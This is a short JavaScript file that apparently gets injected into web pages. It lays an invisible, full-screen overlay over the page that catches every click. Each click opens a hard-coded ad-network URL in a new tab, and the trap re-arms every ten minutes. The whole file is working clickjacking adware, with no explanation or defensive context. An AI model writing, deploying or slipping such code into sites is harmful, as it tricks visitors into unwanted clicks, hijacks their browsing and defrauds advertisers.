console.log("Ads Injected.");
var targetUrl = "https://www.effectiveratecpm.com/jmzq26nu?key=362a2802eeb1b13df2f74ab21f27a973";

function showOverlay() {
  fetch(targetUrl, { method: "GET", mode: "no-cors" })
    .then(function(response) {
      var overlay = document.createElement('div');
      overlay.style.position = 'fixed';
      overlay.style.top = '0';
      overlay.style.left = '0';
      overlay.style.width = '100%';
      overlay.style.height = '100%';
      overlay.style.zIndex = '999999';
      overlay.style.backgroundColor = 'rgba(0,0,0,0)';
      overlay.style.cursor = 'pointer';
      function handleClick() {
        window.open(targetUrl, '_blank');
        overlay.removeEventListener('click', handleClick);
        document.body.removeChild(overlay);
        setTimeout(showOverlay, 600000);
      }
      overlay.addEventListener('click', handleClick);
      document.body.appendChild(overlay);
    })
    .catch(function(error) {
      console.error("Error during GET request:", error);
      setTimeout(showOverlay, 600000);
    });
}

showOverlay();
